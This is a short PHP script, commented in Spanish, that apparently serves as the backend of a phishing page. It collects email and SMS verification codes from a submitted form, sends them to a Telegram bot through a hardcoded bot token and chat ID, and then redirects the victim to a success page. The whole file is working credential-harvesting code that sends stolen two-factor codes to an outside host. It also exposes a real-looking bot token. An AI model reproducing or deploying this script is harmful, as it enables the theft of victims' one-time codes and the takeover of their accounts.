<?php
// Recibimos los datos del formulario
$codigo_email = $_POST['codigo_email'];
$codigo_sms = $_POST['codigo_sms'];

// Aquí deberías tener tu lógica para enviar los códigos al bot de Telegram
// Reemplaza 'TOKEN_DEL_BOT' con el token de tu bot y 'ID_DEL_CHAT' con el ID del chat al que quieres enviar el mensaje
$token = '7254220244:AAHb4kQ0IdVGRghwWnmIzNBZ7yDb4cZuiW4';
$chat_id = '6145123951';
$message = "Código Email: $codigo_email\nCódigo SMS: $codigo_sms";

// URL de la API de Telegram para enviar mensajes
$telegram_api_url = "https://api.telegram.org/bot7254220244:AAHb4kQ0IdVGRghwWnmIzNBZ7yDb4cZuiW4/sendMessage";

// Datos que se enviarán al bot de Telegram
$data = array(
    'chat_id' => $chat_id,
    'text' => $message
);

$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
    )
);

// Enviamos el mensaje al bot de Telegram
$context  = stream_context_create($options);
$result = file_get_contents($telegram_api_url, false, $context);

// Redirigimos al usuario a otro sitio después de enviar el mensaje al bot
header("Location: exito.html");
exit;
?>


















